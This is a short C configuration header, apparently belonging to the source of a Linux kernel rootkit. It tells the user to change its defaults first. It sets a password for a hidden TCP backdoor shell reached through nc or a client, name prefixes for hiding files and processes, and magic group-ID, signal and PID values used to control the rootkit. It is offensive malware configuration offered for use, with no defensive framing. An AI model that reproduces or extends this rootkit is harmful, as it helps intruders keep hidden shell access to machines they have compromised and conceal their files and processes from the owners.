/*
  CHANGE the default macros FIRST!!!
*/

#ifndef CONFIG_H
#define CONFIG_H

#include <linux/ip.h>
#include <linux/tcp.h>

#define DEBUG		0
#define ENCRYPT		1

#define TCP_SHELL_KEY   "@wztshell"     /* our passwd or flag used in nc or client */

#define HIDE_FILE       "test"  /* we will hide the file name began with the HIDE_FILE string. */
#define HIDE_TASK       "bash"  /* we will hide the task name began with the HIDE_TASK string. */

#define HOME            "/"

#define TMPSZ		150

#define SGID		0x489196ab

#define SIG		58
#define PID		12345

#endif



